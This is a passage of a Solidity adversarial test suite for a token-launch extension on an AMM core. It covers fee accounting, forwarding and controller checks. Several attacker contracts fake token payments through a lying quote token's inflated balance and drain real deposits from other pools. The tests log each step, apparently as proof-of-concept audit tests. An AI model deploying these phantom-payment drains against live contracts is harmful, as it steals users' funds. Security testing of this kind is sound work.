            vm.warp(block.timestamp + (seed % 1200));
            bool isBuy = (seed >> 8) % 2 == 0;
            bool exactOut = (seed >> 9) % 2 == 0;
            uint256 mag = (seed >> 16) % 1e24 + 1;
            if (!isBuy) {
                uint256 held = ERC20(inst.token).balanceOf(address(this));
                if (held < 2) continue;
                mag = exactOut ? mag % 1e17 + 1 : mag % held + 1;
            } else if (!exactOut) {
                mag = mag % 1e22 + 1;
            }
            (uint128 s0, uint128 s1) = launch.creatorFees(key);
            uint256 t0 = _balance(key.token0, address(this));
            uint256 t1 = _balance(key.token1, address(this));
            vm.recordLogs();
            PoolBalanceUpdate u = isBuy
                ? _buy(key, inst.token, int128(uint128(mag)), exactOut)
                : _sell(key, inst.token, int128(uint128(mag)), exactOut);
            Obs memory o = _lastSwapped();
            assertEq(o.d0, u.delta0(), "event d0 == settled");
            assertEq(o.d1, u.delta1(), "event d1 == settled");
            assertEq(o.rate, launch.feeAt(key.toPoolId(), block.timestamp), "rate");
            assertLe(o.rate, FEE_5, "rate<=initial");
            assertGe(o.rate, FEE_03, "rate>=final");
            assertEq(int256(t0) - int256(_balance(key.token0, address(this))), int256(u.delta0()), "user0");
            assertEq(int256(t1) - int256(_balance(key.token1, address(this))), int256(u.delta1()), "user1");
            (uint128 n0, uint128 n1) = launch.creatorFees(key);
            assertEq(uint256(n0) - s0, o.feeIs1 ? 0 : o.fee, "ledger0");
            assertEq(uint256(n1) - s1, o.feeIs1 ? o.fee : 0, "ledger1");
            int128 withFee = o.feeIs1 ? u.delta1() : u.delta0();
            int128 raw = withFee - int128(o.fee);
            if (exactOut) {
                assertGe(raw, 0, "exact-out calculated is input");
                assertEq(o.fee, amountBeforeFee(uint128(raw), o.rate) - uint128(raw), "gross-up");
            } else {
                assertLe(raw, 0, "exact-in calculated is output");
                assertEq(o.fee, computeFee(uint128(-raw), o.rate), "output fee");
                assertLe(withFee, 0, "user never pays on output side");
            }
            (uint128 p0, uint128 p1) = _principal(inst);
            assertLe(uint256(p0) + n0, _balance(key.token0, CORE), "Core0 >= principal+fee");
            assertLe(uint256(p1) + n1, _balance(key.token1, CORE), "Core1 >= principal+fee");
        }
    }

    function test_dustTradesPayFee() public {
        (IZeroSeedLaunch.Installation memory inst,) = _create(true, 18, DECAY_RATE);
        vm.warp(START);
        _buy(inst.poolKey, inst.token, 1e18, false);
        (uint128 s0, uint128 s1) = launch.creatorFees(inst.poolKey);
        vm.recordLogs();
        _buy(inst.poolKey, inst.token, 1, true);
        Obs memory o = _lastSwapped();
        assertGe(o.fee, 1, "exact-out dust pays >= 1 raw");
        _sell(inst.poolKey, inst.token, 1_000_000, false);
        (uint128 n0, uint128 n1) = launch.creatorFees(inst.poolKey);
        assertGe(uint256(n0) + n1, uint256(s0) + s1 + 1);
    }
}

/// Bypass, authority, minter and amount-extreme checks on the plain ERC-20 fixture.
contract ZeroSeedLaunchBypassTest is AdversarialBase {
    using CoreLib for ICore;

    function test_bypass_zeroDeltaPositionAndAccumulateAndCollect() public {
        (IZeroSeedLaunch.Installation memory inst,) = _create(true, 18, DECAY_RATE);
        vm.warp(START);
        _buy(inst.poolKey, inst.token, 1e18, false);
        RawLocker raw = new RawLocker(ICore(CORE));
        vm.expectRevert(IZeroSeedLaunch.PositionsThroughCreateOnly.selector);
        raw.run(abi.encodeCall(ICore.updatePosition, (inst.poolKey, inst.positionId, int128(0))));
        vm.expectRevert();
        raw.run(abi.encodeCall(ICore.accumulateAsFees, (inst.poolKey, uint128(1), uint128(0))));
        bytes memory r = raw.run(abi.encodeCall(ICore.collectFees, (inst.poolKey, inst.positionId)));
        (uint128 a, uint128 b) = abi.decode(r, (uint128, uint128));
        assertEq(a + b, 0, "foreign collect empty");
        (bool ok,) = address(launch).call(abi.encodeWithSignature("locked_6416899205(uint256)", uint256(0)));
        assertFalse(ok);
    }

    function test_forward_wrongConfigUnknown() public {
        (IZeroSeedLaunch.Installation memory inst,) = _create(true, 18, DECAY_RATE);
        vm.warp(START);
        PoolKey memory k = inst.poolKey;
        k.config = PoolConfig.wrap(bytes32((uint256(uint160(address(launch))) << 96) | 0x80000000 | uint256(200)));
        vm.expectRevert(IZeroSeedLaunch.UnknownLaunch.selector);
        swapper.forwardSwap(k, createSwapParameters(SqrtRatio.wrap(0), 1e18, true, 0));
    }

    function test_minterRenounced_noHandover_permit2Disclosed() public {
        (IZeroSeedLaunch.Installation memory inst,) = _create(true, 18, DECAY_RATE);
        MintableERC20 t = MintableERC20(inst.token);
        assertEq(t.owner(), address(0));
        vm.expectRevert(Ownable.Unauthorized.selector);
        t.mint(address(this), 1);
        vm.prank(address(launch));
        vm.expectRevert(Ownable.Unauthorized.selector);
        t.mint(address(this), 1);
        address eve = makeAddr("eve");
        vm.prank(eve);
        t.requestOwnershipHandover();
        vm.prank(address(launch));
        vm.expectRevert(Ownable.Unauthorized.selector);
        t.completeOwnershipHandover(eve);
        assertEq(t.totalSupply(), inst.installedSupply + t.balanceOf(address(0)));
        // I-1: solady default, Permit2 holds an infinite allowance for every holder of the launch token.
        assertEq(t.allowance(address(this), 0x000000000022D473030F116dDEE9F6B43aC78BA3), type(uint256).max);
    }

    function test_extremeAmounts_noUnexpectedPanic() public {
        for (uint256 k; k < 2; k++) {
            uint256 snap = vm.snapshotState();
            _extreme(k == 0);
            vm.revertToState(snap);
        }
    }

    function _extreme(bool tokenIs0) internal {
        (IZeroSeedLaunch.Installation memory inst,) = _create(tokenIs0, 18, DECAY_RATE);
        vm.warp(START);
        PoolBalanceUpdate u = _buy(inst.poolKey, inst.token, type(int128).max, false);
        assertGt(_quoteDelta(inst.poolKey, inst.token, u), 0);
        (uint128 p0, uint128 p1) = _principal(inst);
        assertEq(inst.poolKey.token1 == inst.token ? p1 : p0, 0, "token side exhausted");
        uint96 sr = SqrtRatio.unwrap(ICore(CORE).poolState(inst.poolKey.toPoolId()).sqrtRatio());
        assertLe(sr, SqrtRatio.unwrap(tickToSqrtRatio(inst.positionId.tickUpper())), "price clamped at upper");
        assertGe(sr, SqrtRatio.unwrap(tickToSqrtRatio(inst.positionId.tickLower())), "price clamped at lower");
        u = _buy(inst.poolKey, inst.token, 1e30, false);
        assertEq(u.delta0(), 0);
        assertEq(u.delta1(), 0);
        _sell(inst.poolKey, inst.token, int128(uint128(ERC20(inst.token).balanceOf(address(this)))), false);
        sr = SqrtRatio.unwrap(ICore(CORE).poolState(inst.poolKey.toPoolId()).sqrtRatio());
        assertLe(sr, SqrtRatio.unwrap(tickToSqrtRatio(inst.positionId.tickUpper())), "sell clamped at upper");
        assertGe(sr, SqrtRatio.unwrap(tickToSqrtRatio(inst.positionId.tickLower())), "sell clamped at lower");
    }
}

/// @dev Any locker that reaches the extension through Core.forward; used to attack dispatch and identity.
contract MaliciousLocker is BaseLocker {
    using FlashAccountantLib for *;

    constructor(ICore core) BaseLocker(core) {}

    /// @dev Forwards `data` to `to` and returns whatever comes back; leaves any resulting debt on the lock.
    function forwardRaw(address to, bytes memory data) external returns (bytes memory) {
        return lock(abi.encode(to, data, false));
    }

    /// @dev Forwards a claim and withdraws the credited amounts to itself so the lock settles.
    function forwardClaimAndWithdraw(address to, PoolKey memory key) external returns (uint128, uint128) {
        return abi.decode(lock(abi.encode(to, abi.encode(ZERO_SEED_LAUNCH_CLAIM_FEES, key), true)), (uint128, uint128));
    }

    function handleLockData(uint256, bytes memory data) internal override returns (bytes memory) {
        (address to, bytes memory payload, bool withdrawClaim) = abi.decode(data, (address, bytes, bool));
        bytes memory result = ACCOUNTANT.forward(to, payload);
        if (withdrawClaim) {
            (, PoolKey memory key) = abi.decode(payload, (uint256, PoolKey));
            (uint128 a0, uint128 a1) = abi.decode(result, (uint128, uint128));
            ACCOUNTANT.withdrawTwo(key.token0, key.token1, address(this), a0, a1);
        }
        return result;
    }

    receive() external payable {}
}

/// Forward dispatch and identity: action tags cannot alias a swap, unknown payloads are refused before any
/// privileged branch, and the controller of a launch is the authenticated forwarding locker, never a payload field.
contract ZeroSeedLaunchForwardDispatchTest is AdversarialBase {
    using CoreLib for ICore;

    function test_actionTags_derivedAndAboveAddressRange() public pure {
        assertEq(ZERO_SEED_LAUNCH_CREATE, uint256(keccak256("IZeroSeedLaunch#CREATE")), "create tag");
        assertEq(ZERO_SEED_LAUNCH_CLAIM_FEES, uint256(keccak256("IZeroSeedLaunch#CLAIM_FEES")), "claim tag");
        assertTrue(ZERO_SEED_LAUNCH_CREATE >> 160 != 0, "create tag is not an address");
        assertTrue(ZERO_SEED_LAUNCH_CLAIM_FEES >> 160 != 0, "claim tag is not an address");
    }

    function test_forward_unknownOrMalformedPayloadsRefused() public {
        (IZeroSeedLaunch.Installation memory inst,) = _create(false, 18, DECAY_RATE);
        vm.warp(START);
        bytes32 before = _ledgerAndPrincipal(inst);
        MaliciousLocker m = new MaliciousLocker(ICore(CORE));
        bytes[6] memory unknown = [
            bytes(""),
            new bytes(31),
            abi.encode(uint256(keccak256("IZeroSeedLaunch#WITHDRAW")), inst.poolKey),
            abi.encode(uint256(1) << 160, inst.poolKey),
            abi.encode(type(uint256).max),
            // A 128-byte "swap" whose first word is above the address range is not a swap.
            abi.encode(uint256(1) << 160, inst.poolKey.token1, inst.poolKey.config, bytes32(0))
        ];
        for (uint256 i; i < unknown.length; i++) {
            vm.expectRevert(IZeroSeedLaunch.UnknownForwardAction.selector);
            m.forwardRaw(address(launch), unknown[i]);
        }
        // A first word in the address range selects the swap decoder, which refuses a short payload.
        vm.expectRevert();
        m.forwardRaw(address(launch), abi.encode(inst.poolKey.token0, inst.poolKey.token1));
        // A create payload whose tag is right but whose body is not a LaunchParameters fails to decode.
        vm.expectRevert();
        m.forwardRaw(address(launch), abi.encode(ZERO_SEED_LAUNCH_CREATE, uint256(1)));
        assertEq(_ledgerAndPrincipal(inst), before, "nothing changed");
    }

    /// @dev Create forwarded by an arbitrary locker makes that locker the controller: it gets its own token address
    /// (namespaced by the controller), its own pool and its own fee rights. It cannot claim the periphery's launch,
    /// and nothing it sends can name another controller.
    function test_impersonation_controllerIsTheLocker() public {
        (IZeroSeedLaunch.Installation memory inst, IZeroSeedLaunch.LaunchParameters memory p) =
            _create(false, 18, DECAY_RATE);
        vm.warp(START);
        _buy(inst.poolKey, inst.token, 10e18, false);
        (uint128 f0, uint128 f1) = launch.creatorFees(inst.poolKey);
        assertGt(f1, 0, "fees to steal");
        MaliciousLocker m = new MaliciousLocker(ICore(CORE));
        vm.deal(address(m), 100e18);

        // Claim on a launch controlled by the periphery: refused.
        vm.expectRevert(IZeroSeedLaunch.ControllerOnly.selector);
        m.forwardRaw(address(launch), abi.encode(ZERO_SEED_LAUNCH_CLAIM_FEES, inst.poolKey));
        // Claim on a pool that does not exist: unknown.
        PoolKey memory unknown = PoolKey(inst.poolKey.token0, address(0x1234), inst.poolKey.config);
        vm.expectRevert(IZeroSeedLaunch.UnknownLaunch.selector);
        m.forwardRaw(address(launch), abi.encode(ZERO_SEED_LAUNCH_CLAIM_FEES, unknown));

        // Create with the very same parameters the periphery used (its namespaced salt included): a different
        // token, because the controller is part of the CREATE2 salt, so the periphery's launch is untouched.
        IZeroSeedLaunch.LaunchParameters memory q = abi.decode(abi.encode(p), (IZeroSeedLaunch.LaunchParameters));
        q.salt = keccak256(abi.encode(creator, p.salt));
        IZeroSeedLaunch.Installation memory preview = launch.previewInstallation(address(m), q);
        assertTrue(preview.token != inst.token, "controller namespaces the token address");
        q.tradingStart = uint64(block.timestamp);
        vm.recordLogs();
        IZeroSeedLaunch.Installation memory theirs = abi.decode(
            m.forwardRaw(address(launch), abi.encode(ZERO_SEED_LAUNCH_CREATE, q)), (IZeroSeedLaunch.Installation)
        );
        assertEq(theirs.token, preview.token, "preview binding");
        assertEq(launch.getLaunch(theirs.poolKey.toPoolId()).controller, address(m), "controller is the locker");
        assertEq(periphery.launchOwner(theirs.poolKey.toPoolId()), address(0), "periphery knows no owner for it");
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bool seen;
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].topics[0] == IZeroSeedLaunch.LaunchCreated.selector) {
                assertEq(address(uint160(uint256(logs[i].topics[3]))), address(m), "event controller");
                seen = true;
            }
        }
        assertTrue(seen, "LaunchCreated");
        assertEq(MintableERC20(theirs.token).owner(), address(0), "minter renounced");
        assertEq(ERC20(theirs.token).balanceOf(CORE), theirs.installedSupply, "supply in Core");

        // Its own fee rights work, as the controller, and only touch its own ledger.
        MintableERC20(theirs.token).approve(address(swapper), type(uint256).max);
        _buy(theirs.poolKey, theirs.token, 1e18, false);
        (uint128 t0, uint128 t1) = launch.creatorFees(theirs.poolKey);
        (uint128 c0, uint128 c1) = m.forwardClaimAndWithdraw(address(launch), theirs.poolKey);
        assertEq(c0, t0);
        assertEq(c1, t1);
        assertEq(ERC20(theirs.token).balanceOf(address(m)), t1, "its own token fee");
        (uint128 g0, uint128 g1) = launch.creatorFees(inst.poolKey);
        assertEq(g0, f0, "periphery ledger 0 untouched");
        assertEq(g1, f1, "periphery ledger 1 untouched");
        // The periphery's owner still claims its own launch.
        vm.prank(creator);
        (c0, c1) = periphery.claimFees(inst.poolKey, creator);
        assertEq(c0, f0);
        assertEq(c1, f1);
    }

    /// @dev The extension exposes no user-callable mutation: no lock callback, no create, no claim, no ETH receipt.
    function test_extension_noDirectEntrypoints() public {
        (IZeroSeedLaunch.Installation memory inst,) = _create(false, 18, DECAY_RATE);
        bytes[4] memory calls = [
            abi.encodeWithSignature("locked_6416899205(uint256)", uint256(0)),
            abi.encodeWithSignature(
                "create((string,string,uint8,uint128,uint128,int32,int32,uint32,uint64,uint32,uint64,uint64,bytes32))"
            ),
            abi.encodeWithSignature("claimFees((address,address,bytes32),address)", inst.poolKey, creator),
            abi.encodeWithSignature("withdraw()")
        ];
        for (uint256 i; i < calls.length; i++) {
            (bool ok,) = address(launch).call(calls[i]);
            assertFalse(ok, "no such entrypoint");
        }
        (bool sent,) = address(launch).call{value: 1}("");
        assertFalse(sent, "extension refuses ETH");
        (sent,) = address(periphery).call{value: 1}("");
        assertFalse(sent, "periphery refuses ETH");
        (bool okLock,) = address(periphery).call(abi.encodeWithSignature("locked_6416899205(uint256)", uint256(0)));
        assertFalse(okLock, "periphery lock callback only from Core");
        // The forward callback only from Core.
        (bool okFwd,) = address(launch).call(abi.encodeWithSelector(bytes4(uint32(1)), bytes32(0)));
        assertFalse(okFwd, "forwarded() only from Core");
    }
}

/// @dev Baseline control: a locker that never touches any launch. Fakes a Q payment and withdraws Q (or tries
/// another asset) straight from Core.
contract PhantomWithdrawer is BaseLocker {
    using FlashAccountantLib for *;

    constructor(ICore core) BaseLocker(core) {}

    function run(address quote, uint128 fake, address withdrawToken, uint128 amount) external {
        lock(abi.encode(quote, fake, withdrawToken, amount));
    }

    function handleLockData(uint256, bytes memory data) internal override returns (bytes memory) {
        (address quote, uint128 fake, address withdrawToken, uint128 amount) =
            abi.decode(data, (address, uint128, address, uint128));
        (bool s1,) = address(ACCOUNTANT).call(bytes.concat(IFlashAccountant.startPayments.selector, abi.encode(quote)));
        EvilQuote(quote).setInflate(EvilQuote(quote).inflate() + fake);
        (bool s2,) =
            address(ACCOUNTANT).call(bytes.concat(IFlashAccountant.completePayments.selector, abi.encode(quote)));
        require(s1 && s2);
        ACCOUNTANT.withdraw(withdrawToken, address(this), amount);
        return "";
    }

    receive() external payable {}
}

/// @dev Ordinary-Core control: a plain (no extension) pool funded by an honest LP, then a phantom-paid swap.
contract PlainPoolLocker is BaseLocker {
    using CoreLib for ICore;
    using FlashAccountantLib for *;

    constructor(ICore core) BaseLocker(core) {}

    function provide(PoolKey memory key, int32 tick, PositionId pid, int128 liquidity, address payer) external {
        lock(abi.encode(uint256(0), key, tick, pid, liquidity, payer));
    }

    function phantomSwap(PoolKey memory key, SwapParameters params, address quote) external returns (int128, int128) {
        return abi.decode(lock(abi.encode(uint256(1), key, params, quote)), (int128, int128));
    }

    function handleLockData(uint256, bytes memory data) internal override returns (bytes memory) {
        uint256 kind = abi.decode(data, (uint256));
        ICore core = ICore(payable(address(ACCOUNTANT)));
        if (kind == 0) {
            (, PoolKey memory key, int32 tick, PositionId pid, int128 liquidity, address payer) =
                abi.decode(data, (uint256, PoolKey, int32, PositionId, int128, address));
            core.initializePool(key, tick);
            PoolBalanceUpdate u = core.updatePosition(key, pid, liquidity);
            if (u.delta0() > 0) ACCOUNTANT.payFrom(payer, key.token0, uint128(u.delta0()));
            if (u.delta1() > 0) ACCOUNTANT.payFrom(payer, key.token1, uint128(u.delta1()));
            return "";
        }
        (, PoolKey memory key, SwapParameters params, address quote) =
            abi.decode(data, (uint256, PoolKey, SwapParameters, address));
        (PoolBalanceUpdate u,) = core.swap(0, key, params);
        int128 q = key.token0 == quote ? u.delta0() : u.delta1();
        int128 other = key.token0 == quote ? u.delta1() : u.delta0();
        address otherToken = key.token0 == quote ? key.token1 : key.token0;
        (bool s1,) = address(ACCOUNTANT).call(bytes.concat(IFlashAccountant.startPayments.selector, abi.encode(quote)));
        EvilQuote(quote).setInflate(EvilQuote(quote).inflate() + uint128(q));
        (bool s2,) =
            address(ACCOUNTANT).call(bytes.concat(IFlashAccountant.completePayments.selector, abi.encode(quote)));
        require(s1 && s2);
        ACCOUNTANT.withdraw(otherToken, address(this), uint128(-other));
        return abi.encode(q, other);
    }
}

/// Two launches sharing one lying quote Q: Core's Q balance is one shared pot, so whoever can fake Q payments can
/// take the real Q that other Q pools' buyers deposited. The same withdrawal needs no launch at all (FlashAccountant
/// alone), the Q credit cannot pay for native ETH or an honest ERC-20, and an honest asset paired with Q in an
/// ordinary pool is exposed only up to that pool's own reserve. Launches on native ETH and on an honest ERC-20
/// on the same extension and periphery are unaffected and keep trading.
contract ZeroSeedLaunchSharedQuoteTest is AdversarialBase {
    using CoreLib for ICore;

    address attackerOwner = makeAddr("attackerOwner");
    address honestLp = makeAddr("honestLp");

    function _realQ(EvilQuote evil, address who) internal view returns (uint256) {
        return evil.balanceOf(who) - (who == CORE_ADDR ? evil.inflate() : 0);
    }

    function _createOwned(address owner, bytes32 salt) internal returns (IZeroSeedLaunch.Installation memory inst) {
        IZeroSeedLaunch.LaunchParameters memory p = _parameters(ASK_18_18, REQUESTED_SUPPLY, DECAY_RATE);
        p.salt = salt;
        vm.prank(owner);
        inst = periphery.create(p);
        MintableERC20(inst.token).approve(address(swapper), type(uint256).max);
    }

    /// @dev Pool-local facts only: state, principal and fee ledger. Excludes Q's reported Core balance, which the
    /// attacker inflates by construction.
    function _poolFacts(IZeroSeedLaunch.Installation memory inst) internal view returns (bytes32) {
        (uint128 f0, uint128 f1) = launch.creatorFees(inst.poolKey);
        (uint128 p0, uint128 p1) = _principal(inst);
        return keccak256(abi.encode(f0, f1, p0, p1, PoolState.unwrap(ICore(CORE).poolState(inst.poolKey.toPoolId()))));
    }

    IZeroSeedLaunch.Installation honestErc20;
    IZeroSeedLaunch.Installation nativeLaunch;
    IZeroSeedLaunch.Installation attackerLaunch;
    IZeroSeedLaunch.Installation victimLaunch;
    bytes32 honestErc20Before;
    bytes32 nativeBefore;
    bytes32 victimBefore;
    uint256 ethCoreBefore;
    uint256 highCoreBefore;
    uint256 victimTokens;
    uint256 got1;

    function _controls() internal {
        (honestErc20,) = _createWith(creator);
        vm.warp(START);
        _buy(honestErc20.poolKey, honestErc20.token, 1e18, false);
        activeQuote = NATIVE_TOKEN_ADDRESS;
        (nativeLaunch,) = _createOn(periphery, creator);
        MintableERC20(nativeLaunch.token).approve(address(swapper), type(uint256).max);
        _buy(nativeLaunch.poolKey, nativeLaunch.token, 1e18, false);
        honestErc20Before = _ledgerAndPrincipal(honestErc20);
        nativeBefore = _ledgerAndPrincipal(nativeLaunch);
        ethCoreBefore = CORE.balance;
        highCoreBefore = ERC20(QUOTE_HIGH).balanceOf(CORE);
    }

    function _assertControlsUntouched() internal {
        assertEq(CORE.balance, ethCoreBefore, "Core ETH unchanged");
        assertEq(ERC20(QUOTE_HIGH).balanceOf(CORE), highCoreBefore, "Core honest ERC-20 unchanged");
        assertEq(_ledgerAndPrincipal(honestErc20), honestErc20Before, "honest ERC-20 launch untouched");
        assertEq(_ledgerAndPrincipal(nativeLaunch), nativeBefore, "native launch untouched");
        _sell(honestErc20.poolKey, honestErc20.token, 1e20, false);
        _sell(nativeLaunch.poolKey, nativeLaunch.token, 1e20, false);
    }

    /// Attacker-owned launch A and honest launch B share Q. A's owner phantom-pays an exact-output buy on A, then
    /// (a) claims A's Q fee through the periphery and (b) sells A tokens back; the real Q deposited by B's honest
    /// buyer leaves Core, and B's buyer can no longer sell.
    function test_sharedLyingQuote_otherLaunchRealQuoteTaken_unrelatedAssetsIsolated() public {
        _controls();

        EvilQuote evil = _evilAt(QUOTE_LOW);
        activeQuote = address(evil);
        attackerLaunch = _createOwned(attackerOwner, keccak256("A"));
        victimLaunch = _createOwned(creator, keccak256("B"));
        assertEq(attackerLaunch.poolKey.token0, address(evil));
        assertEq(victimLaunch.poolKey.token0, address(evil));
        assertTrue(
            PoolId.unwrap(attackerLaunch.poolKey.toPoolId()) != PoolId.unwrap(victimLaunch.poolKey.toPoolId()),
            "distinct pools"
        );

        // Honest buyer funds B with 5e18 REAL Q (transferred from this contract's real balance).
        _buy(victimLaunch.poolKey, victimLaunch.token, 5e18, false);
        assertEq(_realQ(evil, CORE_ADDR), 5e18, "B's buyer deposited real Q");
        assertEq(evil.inflate(), 0);
        victimBefore = _poolFacts(victimLaunch);
        victimTokens = ERC20(victimLaunch.token).balanceOf(address(this));
        assertGt(victimTokens, 0);

        LyingPayer attacker = new LyingPayer(ICore(CORE));
        uint128 feeQ = _phantomBuyAndClaim(evil, attacker);
        _phantomBuyAndSellBack(evil, attacker, feeQ);

        // B: nominal state, principal and fee ledger untouched; its honest buyer can no longer sell.
        assertEq(_poolFacts(victimLaunch), victimBefore, "B pool state/principal/ledger nominally unchanged");
        vm.expectRevert(bytes4(0x90b8ec18)); // Core withdraw -> Q.transfer fails on real balance -> TransferFailed()
        _sell(victimLaunch.poolKey, victimLaunch.token, int128(uint128(victimTokens)), false);

        // Negative controls: nothing outside Q is reachable. ETH and the honest ERC-20 are untouched and still trade.
        _assertControlsUntouched();
    }

    function _phantomBuyAndClaim(EvilQuote evil, LyingPayer attacker) internal returns (uint128 feeQ) {
        // Phantom exact-output buy #1 on A (fee booked in Q). No real Q moves.
        uint256 fake1;
        (got1, fake1) = attacker.drain(
            attackerLaunch.poolKey,
            createSwapParameters(SqrtRatio.wrap(0), -1e24, true, 0),
            address(evil),
            attackerLaunch.token
        );
        assertEq(_realQ(evil, CORE_ADDR), 5e18, "no real Q paid by the attacker");
        assertEq(evil.inflate(), fake1, "payment was pure balanceOf inflation");
        (feeQ,) = launch.creatorFees(attackerLaunch.poolKey);
        assertGt(feeQ, 0, "A's fee ledger is Q-denominated and nominal");
        assertLt(feeQ, 5e18);
        console2.log("VEC|sharedQuote|buy#1 exact-out got tokens=", got1, " fakePaid Q=", fake1);
        console2.log("VEC|sharedQuote|A fee ledger Q=", feeQ);

        // (a) A's owner claims A's fee through the periphery: Core pays REAL Q deposited by B's buyer.
        vm.prank(attackerOwner);
        periphery.claimFees(attackerLaunch.poolKey, attackerOwner);
        assertEq(_realQ(evil, attackerOwner), feeQ, "claim paid real Q to A's owner");
        assertEq(_realQ(evil, CORE_ADDR), 5e18 - feeQ, "real Q backing B is reduced");
        console2.log("VEC|sharedQuote|(a) real Q at Core after claim=", _realQ(evil, CORE_ADDR));
    }

    function _phantomBuyAndSellBack(EvilQuote evil, LyingPayer attacker, uint128 feeQ) internal {
        // Phantom buy #2: the rest of A's inventory for fake Q, then (b) sell back for exactly the remaining real Q.
        (uint256 got2, uint256 fake2) = attacker.drain(
            attackerLaunch.poolKey,
            createSwapParameters(SqrtRatio.wrap(0), 1e30, false, 0),
            address(evil),
            attackerLaunch.token
        );
        console2.log("VEC|sharedQuote|buy#2 exact-in got tokens=", got2, " fakePaid Q=", fake2);
        uint128 remaining = uint128(_realQ(evil, CORE_ADDR));
        assertEq(remaining, 5e18 - feeQ);
        vm.prank(address(attacker));
        ERC20(attackerLaunch.token).transfer(address(this), got1 + got2);
        _sell(attackerLaunch.poolKey, attackerLaunch.token, int128(remaining), true);
        assertEq(_realQ(evil, CORE_ADDR), 0, "all real Q left Core through A");
        assertEq(_realQ(evil, address(this)), type(uint128).max - 5e18 + remaining, "sold for real Q");
        console2.log("VEC|sharedQuote|(b) real Q at Core after sell-back=", _realQ(evil, CORE_ADDR));
    }

    /// Baseline: the same real-Q loss needs no launch at all. Whoever controls Q's reported Core balance withdraws
    /// every real Q in Core directly through FlashAccountant, and cannot touch any other asset with that credit.
    function test_sharedLyingQuote_coreAloneLosesAllRealQ_noOtherAssetReachable() public {
        (IZeroSeedLaunch.Installation memory erc20Launch,) = _createWith(creator);
        vm.warp(START);
        _buy(erc20Launch.poolKey, erc20Launch.token, 1e18, false);
        activeQuote = NATIVE_TOKEN_ADDRESS;
        (IZeroSeedLaunch.Installation memory ethLaunch,) = _createOn(periphery, creator);
        _buy(ethLaunch.poolKey, ethLaunch.token, 1e18, false);
        uint256 ethBefore = CORE.balance;
        uint256 highBefore = ERC20(QUOTE_HIGH).balanceOf(CORE);
        assertGt(highBefore + ethBefore, 0);

        EvilQuote evil = _evilAt(QUOTE_LOW);
        activeQuote = address(evil);
        IZeroSeedLaunch.Installation memory victim = _createOwned(creator, keccak256("B"));
        _buy(victim.poolKey, victim.token, 5e18, false);
        assertEq(_realQ(evil, CORE_ADDR), 5e18);

        PhantomWithdrawer thief = new PhantomWithdrawer(ICore(CORE));
        // Credit is per token: a Q credit cannot pay for an ETH or honest-ERC-20 withdrawal.
        vm.expectRevert(abi.encodeWithSelector(IFlashAccountant.DebtsNotZeroed.selector, 0));
        thief.run(address(evil), 5e18, NATIVE_TOKEN_ADDRESS, 1);
        vm.expectRevert(abi.encodeWithSelector(IFlashAccountant.DebtsNotZeroed.selector, 0));
        thief.run(address(evil), 5e18, QUOTE_HIGH, 1);
        // The Q credit withdraws all real Q without any launch, swap or extension call.
        thief.run(address(evil), 5e18, address(evil), 5e18);
        assertEq(_realQ(evil, CORE_ADDR), 0, "Core alone: all real Q gone");
        assertEq(_realQ(evil, address(thief)), 5e18);
        assertEq(CORE.balance, ethBefore);
        assertEq(ERC20(QUOTE_HIGH).balanceOf(CORE), highBefore);
        console2.log(
            "VEC|sharedQuote|control: direct FlashAccountant withdrawal of real Q=", _realQ(evil, address(thief))
        );
    }

    /// Ordinary Core behaviour for comparison: an honest asset paired with Q in a plain pool is reachable only up to
    /// what that pool's own liquidity pays out; the honest asset held for an unrelated launch is not.
    function test_sharedLyingQuote_plainCorePoolPairedWithQ_boundedByItsOwnReserve() public {
        (IZeroSeedLaunch.Installation memory erc20Launch,) = _createWith(creator); // honest QUOTE_HIGH launch
        vm.warp(START);
        _buy(erc20Launch.poolKey, erc20Launch.token, 10e18, false);
        uint256 highBefore = ERC20(QUOTE_HIGH).balanceOf(CORE);

        EvilQuote evil = _evilAt(QUOTE_LOW);
        // Honest LP provides QUOTE_HIGH-only liquidity in plain pool (Q, QUOTE_HIGH) just above the current price.
        DecimalsToken(QUOTE_HIGH).transfer(honestLp, 1e18);
        PlainPoolLocker lp = new PlainPoolLocker(ICore(CORE));
        vm.prank(honestLp);
        ERC20(QUOTE_HIGH).approve(address(lp), type(uint256).max);
        PoolKey memory key = PoolKey({
            token0: address(evil), token1: QUOTE_HIGH, config: createConcentratedPoolConfig(0, 100, address(0))
        });
        lp.provide(key, 0, createPositionId(bytes24(0), -1000, 0), 1e18, honestLp);
        uint256 lpDeposited = highBefore + 1e18 - ERC20(QUOTE_HIGH).balanceOf(CORE);
        uint256 poolHigh = ERC20(QUOTE_HIGH).balanceOf(CORE) - highBefore;
        assertGt(poolHigh, 0, "plain pool holds honest QUOTE_HIGH");
        assertEq(lpDeposited + poolHigh, 1e18);

        // Phantom-pay Q, take QUOTE_HIGH: capped by the plain pool's liquidity, never reaching the launch's QUOTE_HIGH.
        (int128 q, int128 outHigh) =
            lp.phantomSwap(key, createSwapParameters(MIN_SQRT_RATIO, 1e30, false, 0), address(evil));
        uint256 taken = uint128(-outHigh);
        console2.log("VEC|sharedQuote|plain pool: fake Q in=", uint128(q), " honest QUOTE_HIGH out=", taken);
        assertLe(taken, poolHigh, "bounded by the Q-paired pool's own reserve");
        assertGe(ERC20(QUOTE_HIGH).balanceOf(CORE), highBefore, "launch's QUOTE_HIGH not reachable");
        // A second phantom swap has nothing left to take.
        (, int128 outHigh2) = lp.phantomSwap(key, createSwapParameters(MIN_SQRT_RATIO, 1e30, false, 0), address(evil));
        assertEq(outHigh2, 0, "pool exhausted; no further honest asset");
    }
}
